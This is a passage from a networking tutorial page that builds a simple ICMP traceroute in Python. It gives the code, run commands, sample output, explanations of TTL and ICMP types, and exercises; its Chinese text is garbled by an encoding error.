class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day06_simple_traceroute.py</span><br><span class="hljs-comment"># åŠŸèƒ½ï¼šå®ç°ç®€å•çš„tracerouteå·¥å…·</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_checksum</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    è®¡ç®—ICMPæ ¡éªŒå’Œï¼ˆä¸pingå·¥å…·ä¸­çš„ç›¸åŒï¼‰</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:<br>        data += <span class="hljs-string">b&#x27;\x00&#x27;</span><br><br>    checksum = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">2</span>):<br>        word = (data[i] &lt;&lt; <span class="hljs-number">8</span>) + data[i + <span class="hljs-number">1</span>]<br>        checksum += word<br><br>    <span class="hljs-keyword">while</span> checksum &gt;&gt; <span class="hljs-number">16</span>:<br>        checksum = (checksum &amp; <span class="hljs-number">0xFFFF</span>) + (checksum &gt;&gt; <span class="hljs-number">16</span>)<br><br>    checksum = ~checksum &amp; <span class="hljs-number">0xFFFF</span><br>    <span class="hljs-keyword">return</span> checksum<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_icmp_packet</span>(<span class="hljs-params">packet_id, sequence</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    åˆ›å»ºICMP Echo Requestæ•°æ®åŒ…</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    icmp_type = <span class="hljs-number">8</span>  <span class="hljs-comment"># Echo Request</span><br>    icmp_code = <span class="hljs-number">0</span><br>    icmp_checksum = <span class="hljs-number">0</span><br><br>    header = struct.pack(<span class="hljs-string">&#x27;!BBHHH&#x27;</span>, icmp_type, icmp_code, icmp_checksum,<br>                         packet_id, sequence)<br>    data = struct.pack(<span class="hljs-string">&#x27;!d&#x27;</span>, time.time())<br><br>    icmp_checksum = calculate_checksum(header + data)<br>    header = struct.pack(<span class="hljs-string">&#x27;!BBHHH&#x27;</span>, icmp_type, icmp_code, icmp_checksum,<br>                         packet_id, sequence)<br><br>    <span class="hljs-keyword">return</span> header + data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_icmp_reply</span>(<span class="hljs-params">packet</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    è§£æICMPå›å¤</span><br><span class="hljs-string"></span><br><span class="hljs-string">    è¿”å›ï¼š</span><br><span class="hljs-string">        (icmp_type, source_ip)</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># è§£æIPå¤´éƒ¨ï¼Œè·å–æºIP</span><br>    ip_header = packet[:<span class="hljs-number">20</span>]<br>    iph = struct.unpack(<span class="hljs-string">&#x27;!BBHHHBBH4s4s&#x27;</span>, ip_header)<br>    source_ip = socket.inet_ntoa(iph[<span class="hljs-number">8</span>])<br><br>    <span class="hljs-comment"># è§£æICMPå¤´éƒ¨</span><br>    icmp_header = packet[<span class="hljs-number">20</span>:<span class="hljs-number">28</span>]<br>    icmp_type, icmp_code = struct.unpack(<span class="hljs-string">&#x27;!BB&#x27;</span>, icmp_header[:<span class="hljs-number">2</span>])<br><br>    <span class="hljs-keyword">return</span> icmp_type, source_ip<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">traceroute</span>(<span class="hljs-params">host, max_hops=<span class="hljs-number">30</span>, timeout=<span class="hljs-number">2</span>, tries=<span class="hljs-number">3</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    è¿½è¸ªåˆ°ç›®æ ‡ä¸»æœºçš„è·¯ç”±è·¯å¾„</span><br><span class="hljs-string"></span><br><span class="hljs-string">    å‚æ•°ï¼š</span><br><span class="hljs-string">        host: ç›®æ ‡ä¸»æœºåæˆ–IP</span><br><span class="hljs-string">        max_hops: æœ€å¤§è·³æ•°</span><br><span class="hljs-string">        timeout: è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰</span><br><span class="hljs-string">        tries: æ¯ä¸€è·³å°è¯•æ¬¡æ•°</span><br><span class="hljs-string"></span><br><span class="hljs-string">    å·¥ä½œåŸç†ï¼š</span><br><span class="hljs-string">        1. ä»TTL=1å¼€å§‹ï¼Œé€æ­¥å¢åŠ TTL</span><br><span class="hljs-string">        2. å‘é€ICMP Echo Request</span><br><span class="hljs-string">        3. æ”¶åˆ°Time Exceededå›å¤æ—¶ï¼Œè®°å½•è¯¥è·¯ç”±å™¨</span><br><span class="hljs-string">        4. æ”¶åˆ°Echo Replyæ—¶ï¼Œè¯´æ˜åˆ°è¾¾ç›®çš„åœ°</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;traceroute to <span class="hljs-subst">&#123;host&#125;</span>, <span class="hljs-subst">&#123;max_hops&#125;</span> hops max&quot;</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># è§£æç›®æ ‡ä¸»æœº</span><br>    <span class="hljs-keyword">try</span>:<br>        dest_ip = socket.gethostbyname(host)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ç›®æ ‡IP: <span class="hljs-subst">&#123;dest_ip&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-keyword">except</span> socket.gaierror:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âŒ æ— æ³•è§£æä¸»æœºå: <span class="hljs-subst">&#123;host&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-comment"># åˆ›å»ºåŸå§‹socketï¼ˆéœ€è¦rootæƒé™ï¼‰</span><br>    <span class="hljs-keyword">try</span>:<br>        send_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)<br>        recv_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)<br>        recv_sock.settimeout(timeout)<br>    <span class="hljs-keyword">except</span> PermissionError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;âŒ éœ€è¦ç®¡ç†å‘˜æƒé™è¿è¡Œæ­¤ç¨‹åº&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ğŸ’¡ Linux/Mac: sudo python day06_simple_traceroute.py&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ğŸ’¡ Windows: ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    packet_id = <span class="hljs-number">12345</span><br>    reached = <span class="hljs-literal">False</span><br><br>    <span class="hljs-comment"># ä»TTL=1å¼€å§‹ï¼Œé€æ­¥å¢åŠ </span><br>    <span class="hljs-keyword">for</span> ttl <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, max_hops + <span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># è®¾ç½®TTL</span><br>        send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)<br><br>        <span class="hljs-comment"># å°è¯•3æ¬¡</span><br>        hop_info = &#123;<br>            <span class="hljs-string">&#x27;ttl&#x27;</span>: ttl,<br>            <span class="hljs-string">&#x27;ip&#x27;</span>: <span class="hljs-literal">None</span>,<br>            <span class="hljs-string">&#x27;hostname&#x27;</span>: <span class="hljs-literal">None</span>,<br>            <span class="hljs-string">&#x27;rtts&#x27;</span>: []<br>        &#125;<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot; <span class="hljs-subst">&#123;ttl:2d&#125;</span>  &quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>, flush=<span class="hljs-literal">True</span>)<br><br>        <span class="hljs-keyword">for</span> attempt <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(tries):<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-comment"># åˆ›å»ºå¹¶å‘é€ICMPåŒ…</span><br>                packet = create_icmp_packet(packet_id, ttl)<br>                send_time = time.time()<br>                send_sock.sendto(packet, (dest_ip, <span class="hljs-number">0</span>))<br><br>                <span class="hljs-comment"># æ¥æ”¶å›å¤</span><br>                <span class="hljs-keyword">try</span>:<br>                    reply_packet, addr = recv_sock.recvfrom(<span class="hljs-number">1024</span>)<br>                    recv_time = time.time()<br>                    rtt = (recv_time - send_time) * <span class="hljs-number">1000</span>  <span class="hljs-comment"># è½¬æ¢ä¸ºæ¯«ç§’</span><br><br>                    <span class="hljs-comment"># è§£æå›å¤</span><br>                    icmp_type, source_ip = parse_icmp_reply(reply_packet)<br><br>                    <span class="hljs-comment"># è®°å½•ä¿¡æ¯</span><br>                    <span class="hljs-keyword">if</span> hop_info[<span class="hljs-string">&#x27;ip&#x27;</span>] <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                        hop_info[<span class="hljs-string">&#x27;ip&#x27;</span>] = source_ip<br><br>                        <span class="hljs-comment"># å°è¯•è·å–ä¸»æœºå</span><br>                        <span class="hljs-keyword">try</span>:<br>                            hostname = socket.gethostbyaddr(source_ip)[<span class="hljs-number">0</span>]<br>                            hop_info[<span class="hljs-string">&#x27;hostname&#x27;</span>] = hostname<br>                        <span class="hljs-keyword">except</span>:<br>                            hop_info[<span class="hljs-string">&#x27;hostname&#x27;</span>] = source_ip<br><br>                    hop_info[<span class="hljs-string">&#x27;rtts&#x27;</span>].append(rtt)<br><br>                    <span class="hljs-comment"># ICMPç±»å‹11 = Time Exceededï¼ˆä¸­é—´è·¯ç”±å™¨ï¼‰</span><br>                    <span class="hljs-comment"># ICMPç±»å‹0 = Echo Replyï¼ˆåˆ°è¾¾ç›®çš„åœ°ï¼‰</span><br>                    <span class="hljs-keyword">if</span> icmp_type == <span class="hljs-number">0</span>:<br>                        reached = <span class="hljs-literal">True</span><br><br>                <span class="hljs-keyword">except</span> socket.timeout:<br>                    hop_info[<span class="hljs-string">&#x27;rtts&#x27;</span>].append(<span class="hljs-literal">None</span>)<br><br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                hop_info[<span class="hljs-string">&#x27;rtts&#x27;</span>].append(<span class="hljs-literal">None</span>)<br><br>        <span class="hljs-comment"># æ‰“å°è¿™ä¸€è·³çš„ä¿¡æ¯</span><br>        <span class="hljs-keyword">if</span> hop_info[<span class="hljs-string">&#x27;ip&#x27;</span>]:<br>            <span class="hljs-keyword">if</span> hop_info[<span class="hljs-string">&#x27;hostname&#x27;</span>] <span class="hljs-keyword">and</span> hop_info[<span class="hljs-string">&#x27;hostname&#x27;</span>] != hop_info[<span class="hljs-string">&#x27;ip&#x27;</span>]:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;hop_info[<span class="hljs-string">&#x27;hostname&#x27;</span>]&#125;</span> (<span class="hljs-subst">&#123;hop_info[<span class="hljs-string">&#x27;ip&#x27;</span>]&#125;</span>)  &quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;hop_info[<span class="hljs-string">&#x27;ip&#x27;</span>]&#125;</span>  &quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br><br>            <span class="hljs-comment"># æ‰“å°RTT</span><br>            <span class="hljs-keyword">for</span> rtt <span class="hljs-keyword">in</span> hop_info[<span class="hljs-string">&#x27;rtts&#x27;</span>]:<br>                <span class="hljs-keyword">if</span> rtt <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;rtt:<span class="hljs-number">.2</span>f&#125;</span> ms  &quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;*  &quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;* * *&quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br><br>        <span class="hljs-built_in">print</span>()  <span class="hljs-comment"># æ¢è¡Œ</span><br><br>        <span class="hljs-comment"># å¦‚æœåˆ°è¾¾ç›®çš„åœ°ï¼Œåœæ­¢</span><br>        <span class="hljs-keyword">if</span> reached:<br>            <span class="hljs-built_in">print</span>()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âœ… å·²åˆ°è¾¾ç›®çš„åœ° <span class="hljs-subst">&#123;dest_ip&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> reached:<br>        <span class="hljs-built_in">print</span>()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âš ï¸  æœªèƒ½åœ¨<span class="hljs-subst">&#123;max_hops&#125;</span>è·³å†…åˆ°è¾¾ç›®çš„åœ°&quot;</span>)<br><br>    send_sock.close()<br>    recv_sock.close()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ä¸»å‡½æ•°</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç®€æ˜“Tracerouteå·¥å…·&quot;</span>.center(<span class="hljs-number">70</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># è·å–ç›®æ ‡ä¸»æœº</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>        host = sys.argv[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">else</span>:<br>        host = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥è¦è¿½è¸ªçš„ä¸»æœºåæˆ–IP: &quot;</span>).strip()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> host:<br>            host = <span class="hljs-string">&quot;baidu.com&quot;</span>  <span class="hljs-comment"># é»˜è®¤</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nğŸ” å¼€å§‹è¿½è¸ªè·¯ç”±è·¯å¾„...\n&quot;</span>)<br><br>    <span class="hljs-comment"># æ‰§è¡Œtraceroute</span><br>    traceroute(host, max_hops=<span class="hljs-number">30</span>, timeout=<span class="hljs-number">2</span>, tries=<span class="hljs-number">3</span>)<br><br>    <span class="hljs-built_in">print</span>()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nğŸ’¡ è¯´æ˜:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   - æ¯ä¸€è¡Œä»£è¡¨ä¸€è·³ï¼ˆä¸€ä¸ªè·¯ç”±å™¨ï¼‰&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   - æ˜¾ç¤º3æ¬¡æµ‹è¯•çš„RTTæ—¶é—´&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   - * è¡¨ç¤ºè¯¥è·¯ç”±å™¨æ²¡æœ‰å“åº”&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   - æŸäº›è·¯ç”±å™¨å¯èƒ½ç¦ç”¨äº†ICMPå“åº”&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="è¿è¡Œç¨‹åº">è¿è¡Œç¨‹åº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Linux/Macï¼ˆéœ€è¦rootæƒé™ï¼‰</span><br><span class="hljs-built_in">sudo</span> python code/day06/day06_simple_traceroute.py baidu.com<br><br><span class="hljs-comment"># Windowsï¼ˆä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œï¼‰</span><br>python code\day06\day06_simple_traceroute.py baidu.com<br></code></pre></td></tr></table></figure><h3 id="é¢„æœŸè¾“å‡º">é¢„æœŸè¾“å‡º</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">======================================================================<br>                      ç®€æ˜“Tracerouteå·¥å…·<br>======================================================================<br><br>ğŸ” å¼€å§‹è¿½è¸ªè·¯ç”±è·¯å¾„...<br><br>traceroute to baidu.com, <span class="hljs-number">30</span> hops max<br><br>ç›®æ ‡IP: <span class="hljs-number">220.181</span>.<span class="hljs-number">38.148</span><br>----------------------------------------------------------------------<br>  <span class="hljs-number">1</span>  <span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>  <span class="hljs-number">1.23</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">1</span>.<span class="hljs-number">12</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">1</span>.<span class="hljs-number">09</span> <span class="hljs-keyword">ms</span><br>  <span class="hljs-title">2</span>  <span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span>  <span class="hljs-number">5.67</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">5</span>.<span class="hljs-number">43</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">5</span>.<span class="hljs-number">34</span> <span class="hljs-keyword">ms</span><br>  <span class="hljs-title">3</span>  <span class="hljs-number">61.135</span>.<span class="hljs-number">169.1</span>  <span class="hljs-number">12.34</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">12</span>.<span class="hljs-number">23</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">12</span>.<span class="hljs-number">12</span> <span class="hljs-keyword">ms</span><br>  <span class="hljs-title">4</span>  <span class="hljs-number">61.135</span>.<span class="hljs-number">169.125</span>  <span class="hljs-number">15.67</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">15</span>.<span class="hljs-number">56</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">15</span>.<span class="hljs-number">45</span> <span class="hljs-keyword">ms</span><br>  <span class="hljs-title">5</span>  * * *<br>  <span class="hljs-number">6</span>  <span class="hljs-number">220.181</span>.<span class="hljs-number">38.148</span>  <span class="hljs-number">28.90</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">28</span>.<span class="hljs-number">78</span> <span class="hljs-keyword">ms</span>  <span class="hljs-title">28</span>.<span class="hljs-number">67</span> <span class="hljs-keyword">ms</span><br><br><span class="hljs-title">âœ… å·²åˆ°è¾¾ç›®çš„åœ° 220</span>.<span class="hljs-number">181.38</span>.<span class="hljs-number">148</span><br><br>======================================================================<br><br>ğŸ’¡ è¯´æ˜:<br>   - æ¯ä¸€è¡Œä»£è¡¨ä¸€è·³ï¼ˆä¸€ä¸ªè·¯ç”±å™¨ï¼‰<br>   - æ˜¾ç¤º<span class="hljs-number">3</span>æ¬¡æµ‹è¯•çš„RTTæ—¶é—´<br>   - * è¡¨ç¤ºè¯¥è·¯ç”±å™¨æ²¡æœ‰å“åº”<br>   - æŸäº›è·¯ç”±å™¨å¯èƒ½ç¦ç”¨äº†ICMPå“åº”<br>======================================================================<br></code></pre></td></tr></table></figure><h2 id="ğŸ”-ä»£ç è¯¦è§£">ğŸ” ä»£ç è¯¦è§£</h2><h3 id="1-è®¾ç½®TTL">1. è®¾ç½®TTL</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯å…³é”®ï¼é€šè¿‡è®¾ç½®socketçš„TTLé€‰é¡¹ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶æ•°æ®åŒ…èƒ½ç»è¿‡å¤šå°‘ä¸ªè·¯ç”±å™¨ã€‚</p><h3 id="2-ICMPæ¶ˆæ¯ç±»å‹">2. ICMPæ¶ˆæ¯ç±»å‹</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># æ”¶åˆ°çš„ICMPç±»å‹ï¼š</span><br>- ç±»å‹<span class="hljs-number">11</span>ï¼ˆTime Exceededï¼‰ï¼šä¸­é—´è·¯ç”±å™¨è¿”å›ï¼Œè¯´æ˜TTLè€—å°½<br>- ç±»å‹<span class="hljs-number">0</span>ï¼ˆEcho Replyï¼‰ï¼šç›®æ ‡ä¸»æœºè¿”å›ï¼Œè¯´æ˜åˆ°è¾¾ç›®çš„åœ°<br></code></pre></td></tr></table></figure><h3 id="3-ä¸ºä»€ä¹ˆè¦å°è¯•3æ¬¡ï¼Ÿ">3. ä¸ºä»€ä¹ˆè¦å°è¯•3æ¬¡ï¼Ÿ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> attempt <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(tries):  <span class="hljs-comment"># å°è¯•3æ¬¡</span><br></code></pre></td></tr></table></figure><p><strong>åŸå› </strong>ï¼š</p><ol><li>ç½‘ç»œå¯èƒ½ä¸ç¨³å®šï¼Œå•æ¬¡æµ‹è¯•ä¸å‡†ç¡®</li><li>å¯ä»¥è®¡ç®—å¹³å‡å»¶è¿Ÿ</li><li>å¯ä»¥æ£€æµ‹ä¸¢åŒ…æƒ…å†µ</li><li>ä¸æ ‡å‡†tracerouteè¡Œä¸ºä¸€è‡´</li></ol><h3 id="4-ä¸ºä»€ä¹ˆæœ‰äº›è·¯ç”±å™¨æ˜¾ç¤º-ï¼Ÿ">4. ä¸ºä»€ä¹ˆæœ‰äº›è·¯ç”±å™¨æ˜¾ç¤º * * * ï¼Ÿ</h3><p>å¯èƒ½çš„åŸå› ï¼š</p><ol><li><strong>é˜²ç«å¢™é˜»æ­¢</strong>ï¼šè¯¥è·¯ç”±å™¨é…ç½®äº†é˜²ç«å¢™ï¼Œä¸å“åº”ICMP</li><li><strong>å®‰å…¨ç­–ç•¥</strong>ï¼šè¿è¥å•†å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œç¦ç”¨äº†ICMPå“åº”</li><li><strong>è´Ÿè½½å‡è¡¡</strong>ï¼šæ¯æ¬¡è¯·æ±‚å¯èƒ½èµ°ä¸åŒè·¯å¾„</li><li><strong>è¶…æ—¶</strong>ï¼šè·¯ç”±å™¨å¤ªå¿™ï¼Œæ¥ä¸åŠå“åº”</li></ol><h2 id="ğŸ“-çŸ¥è¯†å°ç»“">ğŸ“ çŸ¥è¯†å°ç»“</h2><h3 id="ä»Šå¤©å­¦åˆ°äº†ä»€ä¹ˆï¼Ÿ">ä»Šå¤©å­¦åˆ°äº†ä»€ä¹ˆï¼Ÿ</h3><ol><li>âœ… tracerouteé€šè¿‡é€æ­¥å¢åŠ TTLæ¥è¿½è¸ªè·¯å¾„</li><li>âœ… TTL=0æ—¶è·¯ç”±å™¨è¿”å›&quot;Time Exceeded&quot;æ¶ˆæ¯</li><li>âœ… æ¯ä¸€è·³é€šå¸¸æµ‹è¯•3æ¬¡ä»¥è·å¾—ç¨³å®šæ•°æ®</li><li>âœ… æŸäº›è·¯ç”±å™¨å¯èƒ½ä¸å“åº”ICMP</li></ol><h3 id="traceroute-vs-ping">traceroute vs ping</h3><table><thead><tr><th>ç‰¹æ€§</th><th>ping</th><th>traceroute</th></tr></thead><tbody><tr><td>ç›®çš„</td><td>æµ‹è¯•è¿é€šæ€§</td><td>è¿½è¸ªè·¯å¾„</td></tr><tr><td>æ˜¾ç¤ºå†…å®¹</td><td>ç›®æ ‡ä¸»æœºä¿¡æ¯</td><td>æ‰€æœ‰ä¸­é—´è·¯ç”±å™¨</td></tr><tr><td>TTLè®¾ç½®</td><td>å›ºå®šï¼ˆé€šå¸¸64ï¼‰</td><td>é€’å¢ï¼ˆ1, 2, 3â€¦ï¼‰</td></tr><tr><td>æ•°æ®åŒ…æ•°é‡</td><td>å°‘</td><td>å¤š</td></tr><tr><td>æ‰§è¡Œé€Ÿåº¦</td><td>å¿«</td><td>æ…¢</td></tr></tbody></table><h3 id="Windows-vs-Linux-Mac">Windows vs Linux/Mac</h3><table><thead><tr><th>ç‰¹æ€§</th><th>Windows (tracert)</th><th>Linux/Mac (traceroute)</th></tr></thead><tbody><tr><td>åè®®</td><td>ICMP</td><td>UDPï¼ˆé»˜è®¤ï¼‰æˆ–ICMP</td></tr><tr><td>å‘½ä»¤</td><td>tracert</td><td>traceroute</td></tr><tr><td>ICMPé€‰é¡¹</td><td>é»˜è®¤</td><td>-I å‚æ•°</td></tr></tbody></table><h2 id="ğŸ’ª-ç»ƒä¹ é¢˜">ğŸ’ª ç»ƒä¹ é¢˜</h2><h3 id="ç»ƒä¹ 1ï¼šå®é™…æ“ä½œ">ç»ƒä¹ 1ï¼šå®é™…æ“ä½œ</h3><p>ä½¿ç”¨tracerouteè¿½è¸ªä»¥ä¸‹ç½‘ç«™ï¼Œè®°å½•ç»è¿‡çš„è·³æ•°ï¼š</p><ol><li><a href="http://baidu.com">baidu.com</a></li><li><a href="http://google.com">google.com</a>ï¼ˆå¦‚æœèƒ½è®¿é—®ï¼‰</li><li>ä½ çš„å­¦æ ¡æˆ–å…¬å¸ç½‘ç«™</li><li>å›½å¤–çš„ç½‘ç«™ï¼ˆè§‚å¯Ÿå»¶è¿Ÿå˜åŒ–ï¼‰</li></ol><h3 id="ç»ƒä¹ 2ï¼šè·¯å¾„åˆ†æ">ç»ƒä¹ 2ï¼šè·¯å¾„åˆ†æ</h3><p>è§‚å¯Ÿtracerouteçš„è¾“å‡ºï¼Œå›ç­”ï¼š</p><ol><li>ç¬¬ä¸€è·³é€šå¸¸æ˜¯ä»€ä¹ˆè®¾å¤‡ï¼Ÿ</li><li>ä¸ºä»€ä¹ˆæœ‰äº›è·³çš„å»¶è¿Ÿçªç„¶å¢å¤§ï¼Ÿ</li><li>å›½å†…è®¿é—®å›½å¤–ç½‘ç«™ï¼Œé€šå¸¸åœ¨ç¬¬å‡ è·³å‡ºå›½ï¼Ÿ</li></ol><h3 id="ç»ƒä¹ 3ï¼šæ•…éšœè¯Šæ–­">ç»ƒä¹ 3ï¼šæ•…éšœè¯Šæ–­</h3><p>å¦‚æœtracerouteæ˜¾ç¤ºä»¥ä¸‹æƒ…å†µï¼Œè¯´æ˜ä»€ä¹ˆé—®é¢˜ï¼Ÿ</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code 